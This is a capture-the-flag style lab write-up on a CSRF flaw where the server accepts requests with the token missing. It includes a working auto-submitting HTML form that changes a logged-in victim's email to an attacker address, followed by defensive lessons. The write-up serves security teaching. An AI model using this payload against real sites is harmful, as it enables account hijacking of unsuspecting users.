# Lab: CSRF where token validation depends on token being present

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF)

## 🎯 Objective
Bypass CSRF protection by omitting the token.

## 📖 Description
The application checks the CSRF token only if it is present in the request. If the token parameter is missing entirely, the request is accepted.

## 🔍 Vulnerability Analysis
- The server performs incomplete validation: `if token exists then validate it`.
- Missing token = accepted.

## 💥 Exploit Code

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```
Key Learning Points

Validation must reject requests that should contain a token but don't.
"Token is missing" should be treated as invalid.
